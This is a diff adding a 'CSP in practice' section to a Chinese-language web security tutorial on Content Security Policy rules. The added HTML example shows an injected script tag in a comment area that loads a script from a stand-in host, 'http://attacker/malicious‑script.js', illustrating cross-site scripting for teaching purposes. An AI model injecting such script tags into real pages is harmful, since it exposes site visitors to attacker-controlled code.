@@ -363,3 +363,14 @@ CSP 有以下几种规则：
 - **No untrusted sources**: 外部资源只能从一组明确定义的可信资源中加载。
 - **No inline resources**: 内联 JavaScript 和 CSS 不会被执行。
 - **No eval**: 不能使用 JavaScript 中的 eval 函数。
+
+### CSP 实战
+
+在下面的示例中， 攻击者成功的注入了恶意代码到页面中。
+
+```html
+<html>
+  Latest comment:
+  <script src="http://attacker/malicious‑script.js"></script>
+</html>
+```
